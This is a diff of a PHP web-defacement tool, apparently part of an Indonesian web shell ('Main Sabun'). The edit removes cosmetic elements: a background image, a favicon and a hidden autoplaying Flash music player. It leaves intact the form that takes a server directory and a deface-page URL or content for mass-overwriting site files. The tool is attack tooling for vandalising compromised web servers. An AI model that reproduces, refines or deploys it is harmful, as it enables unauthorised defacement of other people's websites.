@@ -126,44 +126,9 @@ if (is_dir($dir)) {
 }
 echo "</textarea></center>";
 
-echo"<link rel=\"SHORTCUT ICON\" href=\"http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif\"><body>
-<style type=\"text/css\">     
-  body { 
-     
-     
-    
-     
-    background: black url(\"http://4.bp.blogspot.com/-2BEPVO2LkPE/U9_eqoQCclI/AAAAAAAAAuI/F0Tcj9rsN6o/s1600/1.png\");
-     
-     
-     
-     
-    background-repeat: repeat;
-     
-    
-     
-     
-    background-position: center;
-     
-     
-     
-     
-    background-attachment: fixed;
-     
-     
-    }
-     
-     
-     
-     
-    </style>
-	
-</div></body>";	
-	
-
 
 ?><br><center>
-<strong>>xXx< ||   MAIN SABUN   || xXx <br></strong>
+<strong>xXx ||   MAIN SABUN   || xXx <br></strong>
 <form action='<?php basename($_SERVER['PHP_SELF']); ?>' method='post'>
 [+] Main Sabun : <input type='text' style='width: 444px' value='<?php  echo getcwd() . "/"; ?>' name='massdefacedir'><br>
 [+] Sabun Masal : <input type='text' style='width: 438px' name='massdefaceurl'><br>
@@ -172,7 +137,7 @@ echo"<link rel=\"SHORTCUT ICON\" href=\"http://i48.servimg.com/u/f48/16/08/07/74
 <div id="result">
 <form method='post'>
 <center>
-			<strong> |||||||||||||||||||||  <blink>Main Sabun Di Room - VIP</blink>  ||||||||||||||||||||| <<br></strong>
+			<strong> |||||||||||||||||||||  Main Sabun Di Room - VIP  ||||||||||||||||||||| <<br></strong>
 			<input name='dir' class="code" style='width: 525px' type='text' value="<? echo getcwd(); ?>"><br><br><strong>Tempat Lokasi Penyabunan<br></strong>
 			<textarea placeholder='Silahkan Menyiapkan Sabun Kesukaan Anda !! ^_^ ' class="evalcode" name='index' style='width: 520px; height: 100px; background:# ;color:black ;'></textarea><br><br>
 			<strong>Pilihan Menu Sabun<br></strong>
@@ -249,12 +214,7 @@ flashing=setInterval("neon()",flashspeed)
 }
 beginneon()
 </script>
-<br /><br />
-<object type="application/x-shockwave-flash" data="http://flash-mp3-player.net/medias/player_mp3_maxi.swf" width="0" height="0">
-    <param name="movie" value="http://flash-mp3-player.net/medias/player_mp3_maxi.swf" />
-    <param name="bgcolor" value="#ffffff" />
-    <param name="FlashVars" value="mp3=https%3A//hshmp3oke.googlecode.com/svn/HsH-Login.mp3&amp;width=0&amp;height=0&amp;autoplay=1&amp;volume=200" />
-</object>	
+	
 
 
 </div></center>			
